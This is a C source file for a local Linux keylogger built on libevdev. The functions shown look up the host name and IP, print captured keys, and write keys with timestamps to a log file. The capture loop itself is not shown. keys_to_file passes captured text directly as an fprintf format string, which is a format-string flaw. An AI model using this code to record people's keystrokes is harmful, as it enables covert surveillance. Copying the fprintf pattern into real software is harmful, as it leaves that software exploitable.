/**
 * Local keylogging
 */

#include "keylogger.h"

// for keylogging
#define _POSIX_SOURCE
#include <arpa/inet.h>  // display hostname
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
// the libevdev library has warnings for the variable names being too short
// NOLINTNEXTLINE
#include <libevdev/libevdev.h>
#include <netdb.h>       // display hostname
#include <netinet/in.h>  // display hostname
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>  // display hostname
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

// this is an indicator for when to stop the keylogging loop. 0 = stop
int log_indicator = 1;

void check_IP_buffer(char* IPbuffer) {
  if (NULL == IPbuffer) {
    perror("inet_ntoa");
    exit(1);
  }
}

void log_device(key_package* key_package) {
  char hostbuffer[256];
  char* IPbuffer;
  struct hostent* host_entry;
  int hostname;

  // To retrieve hostname
  hostname = gethostname(hostbuffer, sizeof(hostbuffer));
  if (hostname == -1) {
    perror("gethostname");
    exit(1);
  }

  // To retrieve host information
  host_entry = gethostbyname(hostbuffer);
  if (host_entry == NULL) {
    perror("gethostbyname");
    exit(1);
  }

  // To convert an Internet network
  // address into ASCII string
  IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));

  // for some reason these fields cause breaks. idk why
  // key_package->host_device_name = hostbuffer;
  // key_package->host_device_IP = IPbuffer;

  printf("Host name: %s\n", hostbuffer);
  printf("Host IP: %s\n", IPbuffer);
}

void reset_structs(key_package* key_package) { key_package->keys_arr_size = 0; }

void print_logged_keys(key_package package) {
  printf("All keys in key_package struct: \n");

  for (size_t i = 0; i < package.keys_arr_size; i++) {
    printf("%s  ", package.keys[i].key);
  }
  printf("\n");
}

void keys_to_file(FILE* package_log, key_package package) {
  char* line = "";
  for (size_t i = 0; i < package.keys_arr_size; i++) {
    fprintf(package_log, "Key:");
    fprintf(package_log, package.keys[i].key);
    fprintf(package_log, " Timestamp: ");
    fprintf(package_log, package.keys[i].timestamp);

    fprintf(package_log, "\t");
  }

  fprintf(package_log, "\n");
}
